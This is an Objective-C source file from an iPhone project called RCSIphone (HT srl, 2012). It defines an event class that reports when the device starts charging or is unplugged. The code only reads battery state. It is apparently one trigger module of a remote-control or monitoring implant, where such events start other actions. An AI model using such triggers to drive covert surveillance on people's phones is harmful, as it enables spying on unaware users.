//
//  RCSIEventACPower.m
//  RCSIphone
//
//  Created by kiodo on 02/03/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#import "RCSIEventACPower.h"
#import "RCSICommon.h"

@implementation RCSIEventACPower

- (id)init
{
  self = [super init];
  if (self) 
    {
      eventType = EVENT_AC;
    }
  
  return self;
}

- (BOOL)readyToTriggerStart
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  UIDevice  *uiDev = [UIDevice currentDevice];
  
  if ([uiDev isBatteryMonitoringEnabled] == FALSE)
    uiDev.batteryMonitoringEnabled = TRUE;
  
  UIDeviceBatteryState battState = [uiDev batteryState];
  
  [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.300]];
  
  if (battState == UIDeviceBatteryStateCharging || battState == UIDeviceBatteryStateFull) 
    {
      bRet = TRUE;
    }
  
  [pool release];
  
  return bRet; 
}

- (BOOL)readyToTriggerEnd
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL bRet = FALSE;
  UIDevice  *uiDev = [UIDevice currentDevice];
  
  if ([uiDev isBatteryMonitoringEnabled] == FALSE)
    uiDev.batteryMonitoringEnabled = TRUE;
  
  UIDeviceBatteryState battState = [uiDev batteryState];
  
  [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.300]];
  
  if (battState == UIDeviceBatteryStateUnplugged) 
    {
      bRet = TRUE;
    }
  
  [pool release];
  
  return bRet;
}
@end
